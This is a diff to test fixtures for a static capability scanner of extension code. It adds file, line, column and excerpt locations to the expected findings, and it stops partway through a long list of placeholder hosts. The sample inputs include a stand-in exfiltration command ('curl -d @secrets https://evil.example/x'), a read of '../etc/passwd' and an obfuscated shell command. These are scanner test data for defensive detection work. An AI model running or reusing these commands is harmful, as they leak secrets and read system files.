@@ -26,7 +26,7 @@
     "schemaVersion": 1,
     "scanner": {
      "id": "navide-static-scan",
-     "version": "1.0.0"
+     "version": "1.2.0"
     },
     "artifactDigest": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
     "target": "universal",
@@ -51,7 +51,15 @@
        "category": "remoteWrite",
        "source": "frontend",
        "evidence": "callSite",
-       "files": 1
+       "files": 1,
+       "sites": [
+        {
+         "file": "frontend/main/app.js",
+         "line": 1,
+         "col": 31,
+         "excerpt": "invoke('shell.run', {command: 'git push'}); const u = 'https://github.com/o/r';invoke('fs.readFile', {path: 'README.md'}"
+        }
+       ]
       }
      ],
      "dynamic": {
@@ -64,7 +72,15 @@
       {
        "host": "github.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/main/app.js",
+         "line": 1,
+         "col": 55,
+         "excerpt": "run', {command: 'git push'}); const u = 'https://github.com/o/r';invoke('fs.readFile', {path: 'README.md'})"
+        }
+       ]
       }
      ]
     },
@@ -78,11 +94,27 @@
     "capabilities": [
      {
       "address": "fs.readFile",
-      "source": "frontend"
+      "source": "frontend",
+      "sites": [
+       {
+        "file": "frontend/main/app.js",
+        "line": 1,
+        "col": 87,
+        "excerpt": "nst u = 'https://github.com/o/r';invoke('fs.readFile', {path: 'README.md'})"
+       }
+      ]
      },
      {
       "address": "shell.run",
-      "source": "frontend"
+      "source": "frontend",
+      "sites": [
+       {
+        "file": "frontend/main/app.js",
+        "line": 1,
+        "col": 8,
+        "excerpt": "invoke('shell.run', {command: 'git push'}); const u = 'https://github.com/o/r';invoke('fs.readFile', {path: 'README.md'}"
+       }
+      ]
      }
     ],
     "code": {
@@ -116,7 +148,7 @@
     "schemaVersion": 1,
     "scanner": {
      "id": "navide-static-scan",
-     "version": "1.0.0"
+     "version": "1.2.0"
     },
     "artifactDigest": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
     "target": "universal",
@@ -146,7 +178,15 @@
     "capabilities": [
      {
       "address": "shell.run",
-      "source": "frontend"
+      "source": "frontend",
+      "sites": [
+       {
+        "file": "frontend/a.js",
+        "line": 3,
+        "col": 59,
+        "excerpt": "{c}` : \"}\"} push`; s = '\\x67it'; invoke('shell.run', {command: s})"
+       }
+      ]
      }
     ],
     "code": {
@@ -183,7 +223,7 @@
     "schemaVersion": 1,
     "scanner": {
      "id": "navide-static-scan",
-     "version": "1.0.0"
+     "version": "1.2.0"
     },
     "artifactDigest": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
     "target": "universal",
@@ -203,7 +243,15 @@
        "category": "other",
        "source": "frontend",
        "evidence": "commandLikeString",
-       "files": 1
+       "files": 1,
+       "sites": [
+        {
+         "file": "frontend/b.mjs",
+         "line": 1,
+         "col": 40,
+         "excerpt": "const s = 'git push origin'; const t = 'curl -d @secrets https://evil.example/x';const w = 'git fetch --all'; const bad "
+        }
+       ]
       },
       {
        "executable": "gh",
@@ -211,7 +259,15 @@
        "category": "remoteRead",
        "source": "frontend",
        "evidence": "callSite",
-       "files": 1
+       "files": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 337,
+         "excerpt": "mr list'}); run('shell.run', {command: 'gh api repos/o/r'});run('shell.run', {command: \"git log --format='%H #x' -n1\"});"
+        }
+       ]
       },
       {
        "executable": "gh",
@@ -219,7 +275,15 @@
        "category": "remoteWrite",
        "source": "frontend",
        "evidence": "callSite",
-       "files": 1
+       "files": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 114,
+         "excerpt": "invoke(\"shell.run\", {cwd: '.', command: \"gh api -X POST repos/o/r/issues\"});run('shell.run', {command: `git status --sho"
+        }
+       ]
       },
       {
        "executable": "gh",
@@ -227,7 +291,15 @@
        "category": "remoteWrite",
        "source": "frontend",
        "evidence": "callSite",
-       "files": 1
+       "files": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 227,
+         "excerpt": "s --short`});run('shell.run', {command: 'gh pr create --title \"a b\" # note'});run('shell.run', {command: 'glab mr list'}"
+        }
+       ]
       },
       {
        "executable": "git",
@@ -235,7 +307,15 @@
        "category": "remoteRead",
        "source": "frontend",
        "evidence": "commandLikeString",
-       "files": 1
+       "files": 1,
+       "sites": [
+        {
+         "file": "frontend/b.mjs",
+         "line": 1,
+         "col": 92,
+         "excerpt": "crets https://evil.example/x';const w = 'git fetch --all'; const bad = 'git \\'unbalanced';"
+        }
+       ]
       },
       {
        "executable": "git",
@@ -243,7 +323,15 @@
        "category": "local",
        "source": "frontend",
        "evidence": "callSite",
-       "files": 1
+       "files": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 385,
+         "excerpt": "repos/o/r'});run('shell.run', {command: \"git log --format='%H #x' -n1\"});"
+        }
+       ]
       },
       {
        "executable": "git",
@@ -251,7 +339,15 @@
        "category": "remoteWrite",
        "source": "frontend",
        "evidence": "callSite",
-       "files": 1
+       "files": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 40,
+         "excerpt": "await c.invoke('shell.run', { command: 'git push origin main' });await c.invoke(\"shell.run\", {cwd: '.', command: \"gh api"
+        }
+       ]
       },
       {
        "executable": "git",
@@ -259,7 +355,15 @@
        "category": "local",
        "source": "frontend",
        "evidence": "callSite",
-       "files": 1
+       "files": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 177,
+         "excerpt": "/r/issues\"});run('shell.run', {command: `git status --short`});run('shell.run', {command: 'gh pr create --title \"a b\" # "
+        }
+       ]
       },
       {
        "executable": "glab",
@@ -267,7 +371,15 @@
        "category": "remoteRead",
        "source": "frontend",
        "evidence": "callSite",
-       "files": 1
+       "files": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 292,
+         "excerpt": "b\" # note'});run('shell.run', {command: 'glab mr list'}); run('shell.run', {command: 'gh api repos/o/r'});run('shell.run"
+        }
+       ]
       }
      ],
      "dynamic": {
@@ -280,7 +392,15 @@
       {
        "host": "evil.example",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/b.mjs",
+         "line": 1,
+         "col": 40,
+         "excerpt": "const s = 'git push origin'; const t = 'curl -d @secrets https://evil.example/x';const w = 'git fetch --all'; const bad "
+        }
+       ]
       }
      ]
     },
@@ -292,7 +412,27 @@
     "capabilities": [
      {
       "address": "shell.run",
-      "source": "frontend"
+      "source": "frontend",
+      "sites": [
+       {
+        "file": "frontend/a.js",
+        "line": 1,
+        "col": 16,
+        "excerpt": "await c.invoke('shell.run', { command: 'git push origin main' });await c.invoke(\"shell.run\", {cwd: '.', command: \"gh api"
+       },
+       {
+        "file": "frontend/a.js",
+        "line": 1,
+        "col": 81,
+        "excerpt": "git push origin main' });await c.invoke(\"shell.run\", {cwd: '.', command: \"gh api -X POST repos/o/r/issues\"});run('shell."
+       },
+       {
+        "file": "frontend/a.js",
+        "line": 1,
+        "col": 154,
+        "excerpt": "\"gh api -X POST repos/o/r/issues\"});run('shell.run', {command: `git status --short`});run('shell.run', {command: 'gh pr "
+       }
+      ]
      }
     ],
     "code": {
@@ -341,7 +481,7 @@
     "schemaVersion": 1,
     "scanner": {
      "id": "navide-static-scan",
-     "version": "1.0.0"
+     "version": "1.2.0"
     },
     "artifactDigest": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
     "target": "universal",
@@ -371,7 +511,27 @@
     "capabilities": [
      {
       "address": "shell.run",
-      "source": "frontend"
+      "source": "frontend",
+      "sites": [
+       {
+        "file": "frontend/a.js",
+        "line": 1,
+        "col": 8,
+        "excerpt": "invoke('shell.run', { command: cmd })"
+       },
+       {
+        "file": "frontend/b.js",
+        "line": 1,
+        "col": 8,
+        "excerpt": "invoke('shell.run', { command: `git ${verb}` })"
+       },
+       {
+        "file": "frontend/c.js",
+        "line": 1,
+        "col": 8,
+        "excerpt": "invoke('shell.run', { command: 'git ' + verb })"
+       }
+      ]
      }
     ],
     "code": {
@@ -405,7 +565,7 @@
     "schemaVersion": 1,
     "scanner": {
      "id": "navide-static-scan",
-     "version": "1.0.0"
+     "version": "1.2.0"
     },
     "artifactDigest": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
     "target": "universal",
@@ -429,32 +589,80 @@
       {
        "host": "10.0.0.1",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 184,
+         "excerpt": "://live.example.org/${id}`); const ip = 'http://10.0.0.1:8080/';const lo = 'http://localhost:3000'; const bad = 'http://"
+        }
+       ]
       },
       {
        "host": "api.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 7,
+         "excerpt": "fetch('https://…@api.example.com/v1/x?token=…');const svg = 'http://www.w3.org/2000/svg'; const r = 'git@github.com:o/r."
+        }
+       ]
       },
       {
        "host": "example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 283,
+         "excerpt": "const bad = 'http://1.2.3/'; const d = 'ftp://.Example.COM./x'"
+        }
+       ]
       },
       {
        "host": "github.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 110,
+         "excerpt": "'http://www.w3.org/2000/svg'; const r = 'git@github.com:o/r.git';open(`wss://live.example.org/${id}`); const ip = 'http:"
+        }
+       ]
       },
       {
        "host": "live.example.org",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 140,
+         "excerpt": "const r = 'git@github.com:o/r.git';open(`wss://live.example.org/${id}`); const ip = 'http://10.0.0.1:8080/';const lo = '"
+        }
+       ]
       },
       {
        "host": "localhost",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 219,
+         "excerpt": "ip = 'http://10.0.0.1:8080/';const lo = 'http://localhost:3000'; const bad = 'http://1.2.3/'; const d = 'ftp://.Example."
+        }
+       ]
       }
      ]
     },
@@ -488,21 +696,21 @@
    },
    "files": {
     "frontend/a.js": {
-     "text": "invoke('fs.readFile', { path: 'README.md' }); invoke('fs.writeFile', { path: '.navide/devmap.json', data });invoke('fs.writeFile', { path: dir + '/x' }); invoke('fs.readFile', { path: '../etc/passwd' });invoke('fs.glob', { cwd: '.', pattern: 'src/**/*.ts' }); invoke('fs.stat', p);invoke('ui.showMessage', {}); invoke('aiCli.start', {}); invoke('storage.get', {key: 'k'})"
+     "text": "invoke('fs.readFile', { path: 'README.md' }); invoke('fs.writeFile', { path: '.navide/devmap.json', data });invoke('fs.writeFile', { path: dir + '/x' }); invoke('fs.readFile', { path: '../etc/passwd' });invoke('fs.glob', { cwd: '.', pattern: 'src/**/*.ts' }); invoke('fs.stat', p);invoke('ui.openExternal', {url}); invoke('aiCli.startSession', {}); invoke('storage.get', {key: 'k'});t('ui.title'); const w = 'ui.sidebarWidth'; invoke('aiCli.start', {})"
     }
    },
    "expected": {
     "schemaVersion": 1,
     "scanner": {
      "id": "navide-static-scan",
-     "version": "1.0.0"
+     "version": "1.2.0"
     },
     "artifactDigest": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
     "target": "universal",
     "coverage": {
      "filesTotal": 1,
      "filesScanned": 1,
-     "bytesScanned": 371,
+     "bytesScanned": 452,
      "skipped": [],
      "truncated": false,
      "timedOut": false
@@ -529,34 +737,203 @@
     },
     "capabilities": [
      {
-      "address": "aiCli.start",
-      "source": "frontend"
+      "address": "aiCli.startSession",
+      "source": "frontend",
+      "sites": [
+       {
+        "file": "frontend/a.js",
+        "line": 1,
+        "col": 323,
+        "excerpt": "nvoke('ui.openExternal', {url}); invoke('aiCli.startSession', {}); invoke('storage.get', {key: 'k'});t('ui.title'); cons"
+       }
+      ]
      },
      {
       "address": "fs.glob",
-      "source": "frontend"
+      "source": "frontend",
+      "sites": [
+       {
+        "file": "frontend/a.js",
+        "line": 1,
+        "col": 211,
+        "excerpt": "ile', { path: '../etc/passwd' });invoke('fs.glob', { cwd: '.', pattern: 'src/**/*.ts' }); invoke('fs.stat', p);invoke('u"
+       }
+      ]
      },
      {
       "address": "fs.readFile",
-      "source": "frontend"
+      "source": "frontend",
+      "sites": [
+       {
+        "file": "frontend/a.js",
+        "line": 1,
+        "col": 8,
+        "excerpt": "invoke('fs.readFile', { path: 'README.md' }); invoke('fs.writeFile', { path: '.navide/devmap.json', data });invoke('fs.w"
+       },
+       {
+        "file": "frontend/a.js",
+        "line": 1,
+        "col": 162,
+        "excerpt": "iteFile', { path: dir + '/x' }); invoke('fs.readFile', { path: '../etc/passwd' });invoke('fs.glob', { cwd: '.', pattern:"
+       }
+      ]
      },
      {
       "address": "fs.stat",
-      "source": "frontend"
+      "source": "frontend",
+      "sites": [
+       {
+        "file": "frontend/a.js",
+        "line": 1,
+        "col": 268,
+        "excerpt": "'.', pattern: 'src/**/*.ts' }); invoke('fs.stat', p);invoke('ui.openExternal', {url}); invoke('aiCli.startSession', {});"
+       }
+      ]
      },
      {
       "address": "fs.writeFile",
-      "source": "frontend"
+      "source": "frontend",
+      "sites": [
+       {
+        "file": "frontend/a.js",
+        "line": 1,
+        "col": 54,
+        "excerpt": "adFile', { path: 'README.md' }); invoke('fs.writeFile', { path: '.navide/devmap.json', data });invoke('fs.writeFile', { "
+       },
+       {
+        "file": "frontend/a.js",
+        "line": 1,
+        "col": 116,
+        "excerpt": ": '.navide/devmap.json', data });invoke('fs.writeFile', { path: dir + '/x' }); invoke('fs.readFile', { path: '../etc/pas"
+       }
+      ]
      },
      {
       "address": "storage.get",
-      "source": "frontend"
+      "source": "frontend",
+      "sites": [
+       {
+        "file": "frontend/a.js",
+        "line": 1,
+        "col": 357,
+        "excerpt": "nvoke('aiCli.startSession', {}); invoke('storage.get', {key: 'k'});t('ui.title'); const w = 'ui.sidebarWidth'; invoke('a"
+       }
+      ]
      },
      {
-      "address": "ui.showMessage",
-      "source": "frontend"
+      "address": "ui.openExternal",
+      "source": "frontend",
+      "sites": [
+       {
+        "file": "frontend/a.js",
+        "line": 1,
+        "col": 289,
+        "excerpt": "*/*.ts' }); invoke('fs.stat', p);invoke('ui.openExternal', {url}); invoke('aiCli.startSession', {}); invoke('storage.get"
+       }
+      ]
      }
     ],
+    "code": {
+     "frontend": {
+      "eval": 0,
+      "newFunction": 0,
+      "dynamicImport": 0,
+      "stringTimers": 0,
+      "obfuscationSignals": []
+     },
+     "backend": null
+    },
+    "native": []
+   }
+  },
+  {
+   "name": "reference-urls",
+   "target": "universal",
+   "manifest": {
+    "schemaVersion": 2,
+    "id": "acme.scoped",
+    "version": "1.0.0",
+    "publisher": "acme"
+   },
+   "files": {
+    "frontend/vue.js": {
+     "text": "const errorInfo = `https://vuejs.org/error-reference/#runtime-${type}`;s=`https://vuejs.org/error-reference/#runtime-${n}`;"
+    },
+    "frontend/real.js": {
+     "text": "fetch('https://vuejs.org/api/'); const r = 'https://vuejs.org/error-reference/#x/../../api';const e = 'https://vuejs.org/error-reference/#https://evil.example.com/x'"
+    }
+   },
+   "expected": {
+    "schemaVersion": 1,
+    "scanner": {
+     "id": "navide-static-scan",
+     "version": "1.2.0"
+    },
+    "artifactDigest": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+    "target": "universal",
+    "coverage": {
+     "filesTotal": 2,
+     "filesScanned": 2,
+     "bytesScanned": 288,
+     "skipped": [],
+     "truncated": false,
+     "timedOut": false
+    },
+    "shell": {
+     "calls": [],
+     "dynamic": {
+      "count": 0,
+      "files": 0
+     }
+    },
+    "network": {
+     "hosts": [
+      {
+       "host": "evil.example.com",
+       "source": "frontend",
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/real.js",
+         "line": 1,
+         "col": 103,
+         "excerpt": "error-reference/#x/../../api';const e = 'https://vuejs.org/error-reference/#https://evil.example.com/x'"
+        }
+       ]
+      },
+      {
+       "host": "vuejs.org",
+       "source": "frontend",
+       "count": 3,
+       "sites": [
+        {
+         "file": "frontend/real.js",
+         "line": 1,
+         "col": 7,
+         "excerpt": "fetch('https://vuejs.org/api/'); const r = 'https://vuejs.org/error-reference/#x/../../api';const e = 'https://vuejs.org"
+        },
+        {
+         "file": "frontend/real.js",
+         "line": 1,
+         "col": 44,
+         "excerpt": "ch('https://vuejs.org/api/'); const r = 'https://vuejs.org/error-reference/#x/../../api';const e = 'https://vuejs.org/er"
+        },
+        {
+         "file": "frontend/real.js",
+         "line": 1,
+         "col": 103,
+         "excerpt": "error-reference/#x/../../api';const e = 'https://vuejs.org/error-reference/#https://evil.example.com/x'"
+        }
+       ]
+      }
+     ]
+    },
+    "files": {
+     "readPaths": [],
+     "writePaths": [],
+     "dynamicPaths": 0
+    },
+    "capabilities": [],
     "code": {
      "frontend": {
       "eval": 0,
@@ -594,7 +971,7 @@
     "schemaVersion": 1,
     "scanner": {
      "id": "navide-static-scan",
-     "version": "1.0.0"
+     "version": "1.2.0"
     },
     "artifactDigest": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
     "target": "universal",
@@ -662,7 +1039,7 @@
     "schemaVersion": 1,
     "scanner": {
      "id": "navide-static-scan",
-     "version": "1.0.0"
+     "version": "1.2.0"
     },
     "artifactDigest": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
     "target": "universal",
@@ -691,7 +1068,15 @@
       {
        "host": "x.example",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 11,
+         "excerpt": null
+        }
+       ]
       }
      ]
     },
@@ -703,7 +1088,15 @@
     "capabilities": [
      {
       "address": "fs.readFile",
-      "source": "frontend"
+      "source": "frontend",
+      "sites": [
+       {
+        "file": "frontend/a.js",
+        "line": 1,
+        "col": 40,
+        "excerpt": null
+       }
+      ]
      }
     ],
     "code": {
@@ -737,7 +1130,7 @@
     "schemaVersion": 1,
     "scanner": {
      "id": "navide-static-scan",
-     "version": "1.0.0"
+     "version": "1.2.0"
     },
     "artifactDigest": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
     "target": "universal",
@@ -761,502 +1154,1302 @@
       {
        "host": "h0.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 1,
+         "excerpt": "'https://h0.example.com';'https://h1.example.com';'https://h2.example.com';'https://h3.example.com';'https://h4.example."
+        }
+       ]
       },
       {
        "host": "h1.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 26,
+         "excerpt": "'https://h0.example.com';'https://h1.example.com';'https://h2.example.com';'https://h3.example.com';'https://h4.example."
+        }
+       ]
       },
       {
        "host": "h10.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 251,
+         "excerpt": "8.example.com';'https://h9.example.com';'https://h10.example.com';'https://h11.example.com';'https://h12.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h100.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 2591,
+         "excerpt": ".example.com';'https://h99.example.com';'https://h100.example.com';'https://h101.example.com';'https://h102.example.com'"
+        }
+       ]
       },
       {
        "host": "h101.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 2618,
+         "excerpt": "example.com';'https://h100.example.com';'https://h101.example.com';'https://h102.example.com';'https://h103.example.com'"
+        }
+       ]
       },
       {
        "host": "h102.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 2645,
+         "excerpt": "example.com';'https://h101.example.com';'https://h102.example.com';'https://h103.example.com';'https://h104.example.com'"
+        }
+       ]
       },
       {
        "host": "h103.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 2672,
+         "excerpt": "example.com';'https://h102.example.com';'https://h103.example.com';'https://h104.example.com';'https://h105.example.com'"
+        }
+       ]
       },
       {
        "host": "h104.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 2699,
+         "excerpt": "example.com';'https://h103.example.com';'https://h104.example.com';'https://h105.example.com';'https://h106.example.com'"
+        }
+       ]
       },
       {
        "host": "h105.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 2726,
+         "excerpt": "example.com';'https://h104.example.com';'https://h105.example.com';'https://h106.example.com';'https://h107.example.com'"
+        }
+       ]
       },
       {
        "host": "h106.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 2753,
+         "excerpt": "example.com';'https://h105.example.com';'https://h106.example.com';'https://h107.example.com';'https://h108.example.com'"
+        }
+       ]
       },
       {
        "host": "h107.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 2780,
+         "excerpt": "example.com';'https://h106.example.com';'https://h107.example.com';'https://h108.example.com';'https://h109.example.com'"
+        }
+       ]
       },
       {
        "host": "h108.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 2807,
+         "excerpt": "example.com';'https://h107.example.com';'https://h108.example.com';'https://h109.example.com';'https://h110.example.com'"
+        }
+       ]
       },
       {
        "host": "h109.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 2834,
+         "excerpt": "example.com';'https://h108.example.com';'https://h109.example.com';'https://h110.example.com';'https://h111.example.com'"
+        }
+       ]
       },
       {
        "host": "h11.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 277,
+         "excerpt": ".example.com';'https://h10.example.com';'https://h11.example.com';'https://h12.example.com';'https://h13.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h110.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 2861,
+         "excerpt": "example.com';'https://h109.example.com';'https://h110.example.com';'https://h111.example.com';'https://h112.example.com'"
+        }
+       ]
       },
       {
        "host": "h111.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 2888,
+         "excerpt": "example.com';'https://h110.example.com';'https://h111.example.com';'https://h112.example.com';'https://h113.example.com'"
+        }
+       ]
       },
       {
        "host": "h112.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 2915,
+         "excerpt": "example.com';'https://h111.example.com';'https://h112.example.com';'https://h113.example.com';'https://h114.example.com'"
+        }
+       ]
       },
       {
        "host": "h113.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 2942,
+         "excerpt": "example.com';'https://h112.example.com';'https://h113.example.com';'https://h114.example.com';'https://h115.example.com'"
+        }
+       ]
       },
       {
        "host": "h114.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 2969,
+         "excerpt": "example.com';'https://h113.example.com';'https://h114.example.com';'https://h115.example.com';'https://h116.example.com'"
+        }
+       ]
       },
       {
        "host": "h115.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 2996,
+         "excerpt": "example.com';'https://h114.example.com';'https://h115.example.com';'https://h116.example.com';'https://h117.example.com'"
+        }
+       ]
       },
       {
        "host": "h116.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3023,
+         "excerpt": "example.com';'https://h115.example.com';'https://h116.example.com';'https://h117.example.com';'https://h118.example.com'"
+        }
+       ]
       },
       {
        "host": "h117.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3050,
+         "excerpt": "example.com';'https://h116.example.com';'https://h117.example.com';'https://h118.example.com';'https://h119.example.com'"
+        }
+       ]
       },
       {
        "host": "h118.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3077,
+         "excerpt": "example.com';'https://h117.example.com';'https://h118.example.com';'https://h119.example.com';'https://h120.example.com'"
+        }
+       ]
       },
       {
        "host": "h119.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3104,
+         "excerpt": "example.com';'https://h118.example.com';'https://h119.example.com';'https://h120.example.com';'https://h121.example.com'"
+        }
+       ]
       },
       {
        "host": "h12.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 303,
+         "excerpt": ".example.com';'https://h11.example.com';'https://h12.example.com';'https://h13.example.com';'https://h14.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h120.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3131,
+         "excerpt": "example.com';'https://h119.example.com';'https://h120.example.com';'https://h121.example.com';'https://h122.example.com'"
+        }
+       ]
       },
       {
        "host": "h121.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3158,
+         "excerpt": "example.com';'https://h120.example.com';'https://h121.example.com';'https://h122.example.com';'https://h123.example.com'"
+        }
+       ]
       },
       {
        "host": "h122.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3185,
+         "excerpt": "example.com';'https://h121.example.com';'https://h122.example.com';'https://h123.example.com';'https://h124.example.com'"
+        }
+       ]
       },
       {
        "host": "h123.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3212,
+         "excerpt": "example.com';'https://h122.example.com';'https://h123.example.com';'https://h124.example.com';'https://h125.example.com'"
+        }
+       ]
       },
       {
        "host": "h124.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3239,
+         "excerpt": "example.com';'https://h123.example.com';'https://h124.example.com';'https://h125.example.com';'https://h126.example.com'"
+        }
+       ]
       },
       {
        "host": "h125.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3266,
+         "excerpt": "example.com';'https://h124.example.com';'https://h125.example.com';'https://h126.example.com';'https://h127.example.com'"
+        }
+       ]
       },
       {
        "host": "h126.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3293,
+         "excerpt": "example.com';'https://h125.example.com';'https://h126.example.com';'https://h127.example.com';'https://h128.example.com'"
+        }
+       ]
       },
       {
        "host": "h127.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3320,
+         "excerpt": "example.com';'https://h126.example.com';'https://h127.example.com';'https://h128.example.com';'https://h129.example.com'"
+        }
+       ]
       },
       {
        "host": "h128.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3347,
+         "excerpt": "example.com';'https://h127.example.com';'https://h128.example.com';'https://h129.example.com';'https://h130.example.com'"
